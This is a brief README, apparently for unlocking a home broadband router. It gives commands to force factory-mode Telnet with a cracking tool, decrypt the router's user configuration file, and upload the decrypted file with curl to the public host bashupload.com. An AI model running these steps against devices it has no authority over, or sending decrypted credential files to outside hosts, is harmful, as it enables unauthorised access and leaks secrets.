## How-To

Enable Telnet & Get Credentials:
```
factorymode_crack.exe -l xxx open -i <routerip> -u <adminuser> -pw <adminpassword>
```

Access Telnet:
```
telnet <routerip>
```

Decrypt Configs:
```
sendcmd 1 DB decry /userconfig/cfg/db_user_cfg.xml
```

Upload Configs:
```
curl https://bashupload.com/db_user_cfg.xml -kT /tmp/debug-decry-cfg
```

Credits:

- https://www.jarvisw.com/?p=1517
- https://github.com/ixmu/Note/blob/578b7e99dd80022c0ee8fa14a8851d8107279320/%E5%AE%B6%E5%BA%AD%E5%AE%BD%E5%B8%A6%E9%85%8D%E7%BD%AEH2-3E.md
